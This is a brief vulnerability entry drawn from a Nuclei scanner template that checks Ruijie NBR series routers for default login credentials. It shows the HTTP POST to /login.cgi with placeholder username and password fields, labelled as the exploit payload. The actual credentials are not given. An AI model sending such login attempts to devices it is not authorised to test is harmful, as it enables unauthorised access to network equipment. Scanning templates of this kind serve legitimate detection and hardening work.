# Nuclei Template: Ruijie NBR Series Routers - Default Login
**Template ID:** ruijie-nbr-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`ruijie-nbr-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Ruijie NBR Series Routers Default Login username and password was discovered.

## Steps to reproduce / Exploit Payload
```http
POST /login.cgi HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}/login.html

user={{username}}&password={{password}}
```

